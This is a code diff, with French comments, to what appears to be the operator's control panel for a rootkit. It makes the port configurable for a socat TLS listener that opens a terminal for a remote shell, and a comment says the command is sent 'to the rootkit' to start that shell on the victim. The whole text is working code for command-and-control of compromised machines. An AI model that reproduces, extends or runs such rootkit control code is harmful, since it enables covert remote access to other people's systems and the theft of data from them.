@@ -79,7 +79,7 @@ def shell_remote():
             if port < 1024 or port > 65535:
                 shell_output = "❌ Le port doit être entre 1024 et 65535."
             else:
-                threading.Thread(target=run_socat_shell).start()
+                threading.Thread(target=run_socat_shell, args=(port,)).start()
                 time.sleep(1)
                 # Envoyer la commande au rootkit pour démarrer le shell distant sur le port choisi
                 with connection_lock:
@@ -258,7 +258,7 @@ def socket_listener():
         print(f"📥 [rootkit] {data.strip()}")
 
 # ---------------------- CLI MODE ----------------------
-def run_socat_shell():
+def run_socat_shell(port=9001):
     terminal_cmd = None
 
     if shutil.which("gnome-terminal"):
@@ -267,13 +267,13 @@ def run_socat_shell():
             "--",
             "bash",
             "-c",
-            "socat openssl-listen:9001,reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash"
+            f"socat openssl-listen:{port},reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash"
         ]
     elif shutil.which("xterm"):
         terminal_cmd = [
             "xterm",
             "-e",
-            "bash -c 'socat openssl-listen:9001,reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash'"
+            f"bash -c 'socat openssl-listen:{port},reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash'"
         ]
     elif shutil.which("konsole"):
         terminal_cmd = [
@@ -281,7 +281,7 @@ def run_socat_shell():
             "-e",
             "bash",
             "-c",
-            "socat openssl-listen:9001,reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash"
+            f"socat openssl-listen:{port},reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash"
         ]
     else:
         print("❌ Aucun terminal compatible trouvé.")
@@ -289,7 +289,7 @@ def run_socat_shell():
 
     try:
         subprocess.Popen(terminal_cmd)
-        print("🚀 Terminal distant lancé sur le port 9001.")
+        print(f"🚀 Terminal distant lancé sur le port {port}.")
     except Exception as e:
         print(f"💥 Erreur socat : {e}")
 
